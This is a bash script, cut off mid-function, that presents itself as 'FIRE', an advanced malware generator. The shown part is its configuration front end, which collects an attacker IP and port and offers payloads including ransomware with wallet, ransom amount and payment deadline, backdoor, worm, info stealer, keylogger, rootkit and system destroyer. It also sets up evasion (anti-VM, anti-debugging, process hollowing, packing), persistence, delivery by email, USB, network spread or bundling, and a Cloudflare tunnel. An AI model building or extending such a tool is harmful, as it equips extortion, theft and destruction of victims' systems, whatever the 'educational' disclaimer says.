#!/bin/bash

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
NC='\033[0m'
BOLD='\033[1m'

DEFAULT_ATTACKER_IP="127.0.0.1"
DEFAULT_ATTACKER_PORT="4444"
DEFAULT_WEB_PORT="8080"
VENV_DIR="./fire_venv"
WORK_DIR="./fire_build"
FINAL_NAME_WIN="pc.exe"
FINAL_NAME_LIN="pc"
LOG_FILE="fire_generator.log"
MAX_LOG_SIZE=1048576
CONFIG_FILE=".fire_config"
TEMP_DIR="/tmp/fire_temp_$$"
DELIVERY_DIR="./fire_delivery"
CLOUDFLARED_DIR="./cloudflared"
RESULTS_DIR="./fire_results"

declare -A ENCRYPTION_ALGORITHMS=(
    ["1"]="AES-256-GCM"
    ["2"]="ChaCha20-Poly1305"
    ["3"]="Blowfish-CBC"
    ["4"]="Serpent-256-CBC"
    ["5"]="Twofish-CBC"
)
declare -A PERSISTENCE_METHODS=(
    ["1"]="registry"
    ["2"]="cron"
    ["3"]="launchd"
    ["4"]="systemd"
    ["5"]="startup_folder"
    ["6"]="wmi_subscription"
)
declare -A OBFUSCATION_TECHNIQUES=(
    ["1"]="basic"
    ["2"]="intermediate"
    ["3"]="advanced"
    ["4"]="professional"
    ["5"]="military_grade"
)
declare -A PACKING_METHODS=(
    ["1"]="upx"
    ["2"]="mpress"
    ["3"]="custom"
    ["4"]="none"
)
declare -A DELIVERY_METHODS=(
    ["1"]="email"
    ["2"]="usb"
    ["3"]="web"
    ["4"]="network"
    ["5"]="social_engineering"
    ["6"]="bundle"
    ["7"]="cloudflare_tunnel"
)
declare -A CRYPTO_WALLET_TYPES=(
    ["1"]="Bitcoin (BTC)"
    ["2"]="Ethereum (ETH)"
    ["3"]="Monero (XMR)"
    ["4"]="Litecoin (LTC)"
    ["5"]="Dash (DASH)"
)

SCRIPT_VERSION="7.97-Auto-WebInterface-Crypto"
BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

ATTACKER_IP=""
ATTACKER_PORT=""
WEB_PORT=""
TARGET_OS=""
FINAL_NAME=""
PAYLOAD_TYPE=""
ENCRYPTION_ALGORITHM="AES-256-GCM"
OBFUSCATION_LEVEL=3
PERSISTENCE_METHOD="registry"
ANTI_DEBUG_ENABLED=true
ANTI_VM_ENABLED=true
PACKER_ENABLED=true
PACKING_METHOD="upx"
SHELLCODE_INJECTION=true
PROCESS_HOLLOWING=true
RUNTIME_DECRYPTION=true
KEEP_BUILD_FILES="false"
DELIVERY_METHOD=""
DELIVERY_TARGETS=""
CLOUDFLARE_TUNNEL_ENABLED=false
CLOUDFLARE_TUNNEL_URL=""
CLOUDFLARE_TUNNEL_PORT="8080"
AUTO_EXECUTION=true
WEB_INTERFACE_ENABLED=true
CRYPTO_WALLET=""
CRYPTO_WALLET_TYPE="1"
CRYPTO_AMOUNT="0.5"
PAYMENT_DEADLINE_HOURS="72"
KEYLOGGER_BUFFER=""

init_logging() {
    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
    
    if [ -f "$LOG_FILE" ] && [ $(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
        mv "$LOG_FILE" "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
        gzip "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)" &
    fi
}

log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %T")
    local log_entry="[$timestamp] [$level] $message"
    
    echo "$log_entry" >> "$LOG_FILE"
    
    case $level in
        "CRITICAL") echo -e "${R}[CRITICAL]${NC} ${BOLD}$message${NC}" ;;
        "ERROR") echo -e "${R}[ERROR]${NC} ${BOLD}$message${NC}" ;;
        "WARNING") echo -e "${Y}[WARNING]${NC} $message${NC}" ;;
        "INFO") echo -e "${G}[INFO]${NC} $message${NC}" ;;
        "DEBUG") echo -e "${B}[DEBUG]${NC} $message${NC}" ;;
        "SUCCESS") echo -e "${G}[SUCCESS]${NC} ${BOLD}$message${NC}" ;;
        *) echo "[$level] $message" ;;
    esac
}

validate_ip() {
    local ip="$1"
    
    [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] && return 1
    
    IFS='.' read -ra ADDR <<< "$ip"
    for i in "${ADDR[@]}"; do
        [[ $i -gt 255 ]] || [[ $i -lt 0 ]] && return 1
    done
    
    [[ "$ip" == "0.0.0.0" ]] || [[ "$ip" == "255.255.255.255" ]] && return 1
    
    local first_octet=${ADDR[0]}
    local second_octet=${ADDR[1]}
    
    if [ "$first_octet" == "10" ] || 
       ([ "$first_octet" == "172" ] && [ "$second_octet" -ge 16 ] && [ "$second_octet" -le 31 ]) ||
       ([ "$first_octet" == "192" ] && [ "$second_octet" == "168" ]); then
        echo -e "${Y}[!] Warning: Using private IP address ($ip)${NC}"
    fi
    
    return 0
}

validate_port() {
    local port="$1"
    
    [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ] && return 1
    
    local reserved_ports=(20 21 22 23 25 53 110 143 443 993 995 1433 3306 3389 5432 5900)
    local service_names=("FTP" "SSH" "Telnet" "SMTP" "DNS" "POP3" "IMAP" "HTTPS" "IMAPS" "POP3S" "MSSQL" "MySQL" "RDP" "PostgreSQL" "VNC")
    
    for i in "${!reserved_ports[@]}"; do
        if [ "$port" -eq "${reserved_ports[$i]}" ]; then
            echo -e "${Y}[!] Warning: Port $port is commonly used for ${service_names[$i]}${NC}"
            break
        fi
    done
    
    return 0
}

validate_crypto_wallet() {
    local wallet=$1
    local wallet_type=$2
    
    case $wallet_type in
        "1") 
            [[ "$wallet" =~ ^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$ ]] || [[ "$wallet" =~ ^bc1[a-z0-9]{39,59}$ ]] && return 0
            ;;
        "2") 
            [[ "$wallet" =~ ^0x[a-fA-F0-9]{40}$ ]] && return 0
            ;;
        "3") 
            [[ "$wallet" =~ ^[48][a-km-zA-HJ-NP-Z1-9]{94}$ ]] && return 0
            ;;
        "4") 
            [[ "$wallet" =~ ^[L3][a-km-zA-HJ-NP-Z1-9]{33}$ ]] || [[ "$wallet" =~ ^ltc1[a-z0-9]{39,59}$ ]] && return 0
            ;;
        "5") 
            [[ "$wallet" =~ ^[X7][a-km-zA-HJ-NP-Z1-9]{33}$ ]] && return 0
            ;;
    esac
    
    return 1
}

display_banner() {
    clear
    
    local os_info=$(uname -s)
    local kernel_info=$(uname -r)
    local arch_info=$(uname -m)
    local cpu_info=$(grep 'model name' /proc/cpuinfo | head -1 | cut -d':' -f2 | xargs 2>/dev/null || echo "Unknown")
    local mem_info=$(free -h | grep '^Mem:' | awk '{print $2}' 2>/dev/null || echo "Unknown")
    local disk_info=$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo "Unknown")
    
    printf '%s\n' "╔════════════════════════════════════════════════════════════╗"
    printf '%s\n' "║  __      __  _    _  _        _____            _   _          ║"
    printf '%s\n' "║  \ \    / / | |  | || |      / ____|    /\    | \ | |         ║"
    printf '%s\n' "║   \ \  / /  | |  | || |     | |        /  \   |  \| |         ║"
    printf '%s\n' "║    \ \/ /   | |  | || |     | |       / /\ \  | . \` |         ║"
    printf '%s\n' "║     \  /    | |__| || |____ | |____  / ____ \ | |\  |         ║"
    printf '%s\n' "║      \/      \____/ |______| \_____|/_/    \_\|_| \_|         ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ FIRE // Advanced Malware Generator v$SCRIPT_VERSION ]       ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ Build ID: $BUILD_ID | Timestamp: $BUILD_TIMESTAMP ]      ║"
    printf '%s\n' "╚════════════════════════════════════════════════════════════╝"
    
    echo -e "\n${B}SYSTEM INFORMATION:${NC}"
    echo -e "${Y}OS:${NC} $os_info $kernel_info"
    echo -e "${Y}Architecture:${NC} $arch_info"
    echo -e "${Y}CPU:${NC} $cpu_info"
    echo -e "${Y}Memory:${NC} $mem_info"
    echo -e "${Y}Free Disk:${NC} $disk_info"
    echo -e "${Y}Build ID:${NC} $BUILD_ID"
    echo -e "${Y}Timestamp:${NC} $BUILD_TIMESTAMP"
    
    echo -e "\n${R}WARNING: This tool is for educational purposes only.${NC}"
    echo -e "${R}Unauthorized use is illegal and unethical.${NC}\n"
}

check_dependencies() {
    log_message "INFO" "Checking dependencies..."
    
    local missing_deps=()
    local outdated_deps=()
    local optional_deps=()
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    else
        local python_version=$(python3 --version 2>&1 | cut -d' ' -f2)
        local python_major=$(echo $python_version | cut -d'.' -f1)
        local python_minor=$(echo $python_version | cut -d'.' -f2)
        
        if [ "$python_major" -lt 3 ] || ([ "$python_major" -eq 3 ] && [ "$python_minor" -lt 7 ]); then
            outdated_deps+=("python3 (version >= 3.7 required, found $python_version)")
        else
            log_message "DEBUG" "Python version OK: $python_version"
        fi
    fi
    
    if ! command -v pip &> /dev/null && ! command -v pip3 &> /dev/null; then
        missing_deps+=("pip")
    else
        local pip_version=$(pip --version 2>/dev/null | cut -d' ' -f2 || pip3 --version 2>/dev/null | cut -d' ' -f2)
        log_message "DEBUG" "Pip version: $pip_version"
    fi
    
    if ! command -v git &> /dev/null; then
        optional_deps+=("git (recommended for version control)")
    fi
    
    if ! command -v upx &> /dev/null; then
        optional_deps+=("upx (recommended for executable compression)")
    fi
    
    if ! command -v sendmail &> /dev/null; then
        optional_deps+=("sendmail (for email delivery)")
    fi
    
    if ! command -v ssh &> /dev/null; then
        optional_deps+=("ssh (for network delivery)")
    fi
    
    if ! command -v wget &> /dev/null && ! command -v curl &> /dev/null; then
        optional_deps+=("wget or curl (for downloading cloudflared)")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ] || [ ${#outdated_deps[@]} -ne 0 ]; then
        echo -e "${R}[!] Critical dependencies missing or outdated:${NC}"
        
        for dep in "${missing_deps[@]}"; do
            echo -e "${R}    Missing: $dep${NC}"
        done
        
        for dep in "${outdated_deps[@]}"; do
            echo -e "${Y}    Outdated: $dep${NC}"
        done
        
        echo -e "${Y}[*] Please install/update missing dependencies and try again.${NC}"
        log_message "ERROR" "Missing/outdated dependencies: ${missing_deps[*]} ${outdated_deps[*]}"
        exit 1
    fi
    
    if [ ${#optional_deps[@]} -ne 0 ]; then
        echo -e "${Y}[!] Optional dependencies not found (not critical):${NC}"
        for dep in "${optional_deps[@]}"; do
            echo -e "${Y}    $dep${NC}"
        done
    fi
    
    log_message "SUCCESS" "All critical dependencies are installed and up to date"
}

setup_cloudflared() {
    log_message "INFO" "Setting up Cloudflare tunnel..."
    
    mkdir -p "$CLOUDFLARED_DIR"
    
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    case "$arch" in
        x86_64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l) arch="arm" ;;
        *) arch="amd64" ;;
    esac
    
    case "$os" in
        linux) os="linux" ;;
        darwin) os="darwin" ;;
        *) os="linux" ;;
    esac
    
    local cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${os}-${arch}"
    
    if [ ! -f "$cloudflared_binary" ]; then
        echo -e "${Y}[*] Downloading cloudflared...${NC}"
        
        if command -v wget &> /dev/null; then
            wget -q "$cloudflared_url" -O "$cloudflared_binary"
        elif command -v curl &> /dev/null; then
            curl -sL "$cloudflared_url" -o "$cloudflared_binary"
        else
            log_message "ERROR" "Neither wget nor curl is available to download cloudflared"
            return 1
        fi
        
        if [ $? -ne 0 ]; then
            log_message "ERROR" "Failed to download cloudflared"
            return 1
        fi
        
        chmod +x "$cloudflared_binary"
        log_message "SUCCESS" "cloudflared downloaded successfully"
    else
        log_message "INFO" "cloudflared already exists"
    fi
    
    if "$cloudflared_binary" --version &> /dev/null; then
        local version=$("$cloudflared_binary" --version | cut -d' ' -f2)
        log_message "INFO" "cloudflared version: $version"
        return 0
    else
        log_message "ERROR" "cloudflared binary is not working"
        return 1
    fi
}

start_cloudflare_tunnel() {
    local local_port=$1
    local tunnel_dir=$2
    
    log_message "INFO" "Starting Cloudflare tunnel on port $local_port..."
    
    local tunnel_log="$TEMP_DIR/tunnel.log"
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    
    "$cloudflared_binary" tunnel --url "http://localhost:$local_port" --logfile "$tunnel_log" &
    local tunnel_pid=$!
    
    sleep 8
    
    if [ -f "$tunnel_log" ]; then
        local tunnel_url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' "$tunnel_log" | head -1)
        if [ -n "$tunnel_url" ]; then
            CLOUDFLARE_TUNNEL_URL="$tunnel_url"
            echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
            log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
            return 0
        fi
    fi
    
    sleep 5
    tunnel_url=$(ps aux | grep cloudflared | grep -o 'https://[^[:space:]]*\.trycloudflare\.com' | head -1)
    if [ -n "$tunnel_url" ]; then
        CLOUDFLARE_TUNNEL_URL="$tunnel_url"
        echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
        log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
        return 0
    fi
    
    sleep 2
    if [ -f "$tunnel_log" ]; then
        tunnel_url=$(grep -o 'https://[^[:space:]]*' "$tunnel_log" | grep trycloudflare | head -1)
        if [ -n "$tunnel_url" ]; then
            CLOUDFLARE_TUNNEL_URL="$tunnel_url"
            echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
            log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
            return 0
        fi
    fi
    
    log_message "ERROR" "Failed to start Cloudflare tunnel"
    return 1
}

stop_cloudflare_tunnel() {
    if [ -f "$TEMP_DIR/tunnel.pid" ]; then
        local tunnel_pid=$(cat "$TEMP_DIR/tunnel.pid")
        if kill -0 "$tunnel_pid" 2>/dev/null; then
            kill "$tunnel_pid"
            log_message "INFO" "Cloudflare tunnel stopped"
        fi
        rm -f "$TEMP_DIR/tunnel.pid"
    fi
}

setup_environment() {
    log_message "INFO" "Setting up environment..."
    
    mkdir -p "$TEMP_DIR"
    mkdir -p "$DELIVERY_DIR"
    mkdir -p "$RESULTS_DIR"
    
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
        if ! python3 -m venv "$VENV_DIR" --system-site-packages; then
            log_message "ERROR" "Failed to create virtual environment"
            exit 1
        fi
        log_message "SUCCESS" "Virtual environment created"
    else
        log_message "INFO" "Using existing virtual environment"
    fi
    
    if ! source "$VENV_DIR/bin/activate"; then
        log_message "ERROR" "Failed to activate virtual environment"
        exit 1
    fi
    
    echo -e "${Y}[*] Upgrading pip and setuptools...${NC}"
    if ! pip install --quiet --upgrade pip setuptools wheel; then
        log_message "WARNING" "Failed to upgrade pip/setuptools"
    fi
    
    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask" "flask-socketio")
    
    for package in "${required_packages[@]}"; do
        if ! python3 -c "import ${package//-/_}" &> /dev/null; then
            echo -e "${Y}[*] Installing $package...${NC}"
            if ! pip install --quiet "$package"; then
                log_message "ERROR" "Failed to install $package"
                exit 1
            fi
            log_message "SUCCESS" "$package installed"
        else
            log_message "DEBUG" "$package already installed"
        fi
    done
    
    mkdir -p "$WORK_DIR"
    if ! cd "$WORK_DIR"; then
        log_message "ERROR" "Failed to create/access work directory"
        exit 1
    fi
    
    pip freeze > requirements.txt
    log_message "INFO" "Requirements saved to requirements.txt"
    
    log_message "SUCCESS" "Environment setup complete"
}

get_configuration() {
    echo -e "${B}CONFIGURATION:${NC}"
    
    while true; do
        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
        
        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
            log_message "INFO" "Using attacker IP: $ATTACKER_IP"
            break
        else
            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
        fi
    done

    while true; do
        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
        
        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
            log_message "INFO" "Using attacker port: $ATTACKER_PORT"
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    while true; do
        read -p "Enter web interface port [default: $DEFAULT_WEB_PORT]: " WEB_PORT
        WEB_PORT=${WEB_PORT:-$DEFAULT_WEB_PORT}
        
        if validate_port "$WEB_PORT" || [ "$WEB_PORT" == "$DEFAULT_WEB_PORT" ]; then
            log_message "INFO" "Using web port: $WEB_PORT"
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    read -p "Configure advanced options? [y/N]: " adv_config
    if [[ "$adv_config" =~ ^[Yy]$ ]]; then
        advanced_config
    fi

    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
    echo "1) Windows"
    echo "2) Linux"
    echo "3) macOS"
    echo "4) Cross-platform"
    while true; do
        read -p ">> " os_choice
        case $os_choice in
            1)
                TARGET_OS="Windows"
                FINAL_NAME="$FINAL_NAME_WIN"
                log_message "INFO" "Target OS selected: Windows"
                break
                ;;
            2)
                TARGET_OS="Linux"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Linux"
                break
                ;;
            3)
                TARGET_OS="macOS"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: macOS"
                break
                ;;
            4)
                TARGET_OS="Cross-platform"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Cross-platform"
                break
                ;;
            *)
                echo -e "${R}[!] Invalid OS choice. Please enter 1-4.${NC}"
                ;;
        esac
    done

    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
    echo "1) Bricker (System Destroyer)"
    echo "2) Backdoor (Remote Access)"
    echo "3) Ransomware (File Encryptor)"
    echo "4) Worm (Network Spreader)"
    echo "5) Info Stealer (Data Exfiltration)"
    echo "6) Network Destroyer (DDoS Tool)"
    echo "7) Keylogger (Input Capture)"
    echo "8) Rootkit (System Stealth)"
    echo "9) Custom Payload Template"
    while true; do
        read -p ">> " payload_choice
        if [[ "$payload_choice" =~ ^[1-9]$ ]]; then
            PAYLOAD_TYPE="$payload_choice"
            log_message "INFO" "Payload type selected: $payload_choice"
            break
        else
            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-9.${NC}"
        fi
    done

    if [ "$PAYLOAD_TYPE" == "3" ]; then
        echo -e "\n${B}RANSOMWARE CONFIGURATION:${NC}"
        
        echo -e "${Y}Select cryptocurrency type:${NC}"
        for i in "${!CRYPTO_WALLET_TYPES[@]}"; do
            echo "$i) ${CRYPTO_WALLET_TYPES[$i]}"
        done
        
        while true; do
            read -p ">> " crypto_choice
            if [[ "$crypto_choice" =~ ^[1-5]$ ]]; then
                CRYPTO_WALLET_TYPE="$crypto_choice"
                log_message "INFO" "Crypto wallet type selected: ${CRYPTO_WALLET_TYPES[$crypto_choice]}"
                break
            else
                echo -e "${R}[!] Invalid crypto type. Please enter a number between 1-5.${NC}"
            fi
        done
        
        while true; do
            read -p "Enter your ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]} wallet address (for educational demonstration): " CRYPTO_WALLET
            if [ -n "$CRYPTO_WALLET" ]; then
                if validate_crypto_wallet "$CRYPTO_WALLET" "$CRYPTO_WALLET_TYPE"; then
                    log_message "INFO" "Crypto wallet configured: $CRYPTO_WALLET"
                    break
                else
                    echo -e "${R}[!] Invalid wallet address format. Please try again.${NC}"
                fi
            else
                case $CRYPTO_WALLET_TYPE in
                    "1") CRYPTO_WALLET="bc1qexample_address_for_educational_purposes_only" ;;
                    "2") CRYPTO_WALLET="0xexample_address_for_educational_purposes_only" ;;
                    "3") CRYPTO_WALLET="4example_address_for_educational_purposes_only" ;;
                    "4") CRYPTO_WALLET="Lexample_address_for_educational_purposes_only" ;;
                    "5") CRYPTO_WALLET="Xexample_address_for_educational_purposes_only" ;;
                esac
                log_message "INFO" "Using default educational wallet address: $CRYPTO_WALLET"
                break
            fi
        done
        
        read -p "Enter ransom amount in ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]} [default: $CRYPTO_AMOUNT]: " crypto_amount
        CRYPTO_AMOUNT=${crypto_amount:-$CRYPTO_AMOUNT}
        
        read -p "Enter payment deadline in hours [default: $PAYMENT_DEADLINE_HOURS]: " deadline_hours
        PAYMENT_DEADLINE_HOURS=${deadline_hours:-$PAYMENT_DEADLINE_HOURS}
        
        log_message "INFO" "Ransomware configuration: ${CRYPTO_WALLET_TYPES[$CRYPTO_WALLET_TYPE]} $CRYPTO_AMOUNT, deadline $PAYMENT_DEADLINE_HOURS hours"
    fi

    read -p "Enter custom filename (leave empty for default): " CUSTOM_NAME
    if [ -n "$CUSTOM_NAME" ]; then
        if [ "$TARGET_OS" == "Windows" ] && [[ ! "$CUSTOM_NAME" =~ \.exe$ ]]; then
            CUSTOM_NAME="${CUSTOM_NAME}.exe"
        fi
        FINAL_NAME="$CUSTOM_NAME"
        log_message "INFO" "Using custom filename: $FINAL_NAME"
    fi

    echo -e "\n${B}AUTO-EXECUTION CONFIGURATION:${NC}"
    read -p "Enable auto-execution on installation? [Y/n]: " auto_exec
    AUTO_EXECUTION=true
    if [[ "$auto_exec" =~ ^[Nn]$ ]]; then
        AUTO_EXECUTION=false
    fi
    
    if [ "$AUTO_EXECUTION" = true ]; then
        echo -e "${Y}[*] Auto-execution will be enabled for this payload.${NC}"
        log_message "INFO" "Auto-execution enabled"
    else
        echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
        log_message "INFO" "Auto-execution disabled"
    fi

    echo -e "\n${B}WEB INTERFACE CONFIGURATION:${NC}"
    read -p "Enable web interface for results? [Y/n]: " web_iface
    WEB_INTERFACE_ENABLED=true
    if [[ "$web_iface" =~ ^[Nn]$ ]]; then
        WEB_INTERFACE_ENABLED=false
    fi
    
    if [ "$WEB_INTERFACE_ENABLED" = true ]; then
        echo -e "${Y}[*] Web interface will be enabled on http://$ATTACKER_IP:$WEB_PORT${NC}"
        log_message "INFO" "Web interface enabled"
    else
        echo -e "${Y}[*] Web interface will be disabled.${NC}"
        log_message "INFO" "Web interface disabled"
    fi

    read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
    KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
    if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
        KEEP_BUILD_FILES="true"
        log_message "INFO" "User chose to keep build files"
    else
        KEEP_BUILD_FILES="false"
        log_message "INFO" "User chose not to keep build files"
    fi

    echo -e "\n${B}DELIVERY CONFIGURATION:${NC}"
    echo "1) Email Delivery"
    echo "2) USB Drive Preparation"
    echo "3) Web Server Hosting"
    echo "4) Network Distribution"
    echo "5) Social Engineering Kit"
    echo "6) Application Bundling"
    echo "7) Cloudflare Tunnel (Secure Remote Access)"
    echo "8) Skip Delivery (Generate Only)"
    
    while true; do
        read -p "Select delivery method: " delivery_choice
        if [[ "$delivery_choice" =~ ^[1-8]$ ]]; then
            if [ "$delivery_choice" -eq 8 ]; then
                DELIVERY_METHOD=""
                log_message "INFO" "Skipping delivery configuration"
                break
            else
                DELIVERY_METHOD="${DELIVERY_METHODS[$delivery_choice]}"
                log_message "INFO" "Delivery method selected: $DELIVERY_METHOD"
                break
            fi
        else
            echo -e "${R}[!] Invalid delivery method. Please enter a number between 1-8.${NC}"
        fi
    done

    if [ -n "$DELIVERY_METHOD" ]; then
        case "$DELIVERY_METHOD" in
            "email")
                read -p "Enter recipient email (comma-separated for multiple): " DELIVERY_TARGETS
                ;;
            "usb")
                read -p "Enter USB device path (e.g., /dev/sdb1): " DELIVERY_TARGETS
                ;;
            "web")
                read -p "Enter web server directory (e.g., /var/www/html): " DELIVERY_TARGETS
                ;;
            "network")
                read -p "Enter target network range (e.g., 192.168.1.0/24): " DELIVERY_TARGETS
                ;;
            "social_engineering")
                read -p "Enter social engineering template name: " DELIVERY_TARGETS
                ;;
            "bundle")
                read -p "Enter legitimate application to bundle with: " DELIVERY_TARGETS
                ;;
            "cloudflare_tunnel")
                read -p "Enter local port for tunnel [default: $CLOUDFLARE_TUNNEL_PORT]: " tunnel_port
                CLOUDFLARE_TUNNEL_PORT=${tunnel_port:-$CLOUDFLARE_TUNNEL_PORT}
                DELIVERY_TARGETS="$CLOUDFLARE_TUNNEL_PORT"
                CLOUDFLARE_TUNNEL_ENABLED=true
                ;;
        esac
        log_message "INFO" "Delivery targets: $DELIVERY_TARGETS"
    fi

    save_config
}

advanced_config() {
    echo -e "\n${B}ADVANCED CONFIGURATION:${NC}"
    
    echo -e "${Y}Select encryption algorithm:${NC}"
    for i in "${!ENCRYPTION_ALGORITHMS[@]}"; do
        echo "$i) ${ENCRYPTION_ALGORITHMS[$i]}"
    done
    read -p ">> " enc_choice
    ENCRYPTION_ALGORITHM="${ENCRYPTION_ALGORITHMS[$enc_choice]:-${ENCRYPTION_ALGORITHMS[1]}}"
    
    echo -e "\n${Y}Select obfuscation level:${NC}"
    for i in "${!OBFUSCATION_TECHNIQUES[@]}"; do
        echo "$i) ${OBFUSCATION_TECHNIQUES[$i]}"
    done
    read -p ">> " obs_choice
    OBFUSCATION_LEVEL=$obs_choice
    
    echo -e "\n${Y}Select persistence method:${NC}"
    for i in "${!PERSISTENCE_METHODS[@]}"; do
        echo "$i) ${PERSISTENCE_METHODS[$i]}"
    done
    read -p ">> " pers_choice
    PERSISTENCE_METHOD="${PERSISTENCE_METHODS[$pers_choice]:-${PERSISTENCE_METHODS[1]}}"
    
    echo -e "\n${Y}Select packing method:${NC}"
    for i in "${!PACKING_METHODS[@]}"; do
        echo "$i) ${PACKING_METHODS[$i]}"
    done
    read -p ">> " pack_choice
    PACKING_METHOD="${PACKING_METHODS[$pack_choice]:-${PACKING_METHODS[1]}}"
    
    read -p "Enable anti-debugging? [Y/n]: " anti_debug
    ANTI_DEBUG_ENABLED=true
    if [[ "$anti_debug" =~ ^[Nn]$ ]]; then
        ANTI_DEBUG_ENABLED=false
    fi
    
    read -p "Enable anti-VM detection? [Y/n]: " anti_vm
    ANTI_VM_ENABLED=true
    if [[ "$anti_vm" =~ ^[Nn]$ ]]; then
        ANTI_VM_ENABLED=false
    fi
    
    read -p "Enable shellcode injection? [Y/n]: " shellcode
    SHELLCODE_INJECTION=true
    if [[ "$shellcode" =~ ^[Nn]$ ]]; then
        SHELLCODE_INJECTION=false
    fi
    
    read -p "Enable process hollowing? [Y/n]: " hollowing
    PROCESS_HOLLOWING=true
    if [[ "$hollowing" =~ ^[Nn]$ ]]; then
        PROCESS_HOLLOWING=false
    fi
    
    read -p "Enable runtime decryption? [Y/n]: " runtime_decrypt
    RUNTIME_DECRYPTION=true
    if [[ "$runtime_decrypt" =~ ^[Nn]$ ]]; then
        RUNTIME_DECRYPTION=false
    fi
    
    log_message "INFO" "Advanced configuration updated"
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
ATTACKER_IP="$ATTACKER_IP"
ATTACKER_PORT="$ATTACKER_PORT"
WEB_PORT="$WEB_PORT"
TARGET_OS="$TARGET_OS"
FINAL_NAME="$FINAL_NAME"
PAYLOAD_TYPE="$PAYLOAD_TYPE"
ENCRYPTION_ALGORITHM="$ENCRYPTION_ALGORITHM"
OBFUSCATION_LEVEL=$OBFUSCATION_LEVEL
PERSISTENCE_METHOD="$PERSISTENCE_METHOD"
ANTI_DEBUG_ENABLED=$ANTI_DEBUG_ENABLED
ANTI_VM_ENABLED=$ANTI_VM_ENABLED
PACKER_ENABLED=$PACKER_ENABLED
PACKING_METHOD="$PACKING_METHOD"
SHELLCODE_INJECTION=$SHELLCODE_INJECTION
PROCESS_HOLLOWING=$PROCESS_HOLLOWING
RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
AUTO_EXECUTION=$AUTO_EXECUTION
WEB_INTERFACE_ENABLED=$WEB_INTERFACE_ENABLED
CRYPTO_WALLET="$CRYPTO_WALLET"
CRYPTO_WALLET_TYPE="$CRYPTO_WALLET_TYPE"
CRYPTO_AMOUNT="$CRYPTO_AMOUNT"
PAYMENT_DEADLINE_HOURS="$PAYMENT_DEADLINE_HOURS"
KEEP_BUILD_FILES=$KEEP_BUILD_FILES
DELIVERY_METHOD="$DELIVERY_METHOD"
DELIVERY_TARGETS="$DELIVERY_TARGETS"
CLOUDFLARE_TUNNEL_ENABLED=$CLOUDFLARE_TUNNEL_ENABLED
CLOUDFLARE_TUNNEL_PORT="$CLOUDFLARE_TUNNEL_PORT"
EOF
    log_message "INFO" "Configuration saved to $CONFIG_FILE"
}

load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE" 2>/dev/null || log_message "WARNING" "Failed to load configuration file"
        log_message "INFO" "Configuration loaded from $CONFIG_FILE"
        return 0
    fi
    return 1
}

validate_config() {
    local errors=()
    
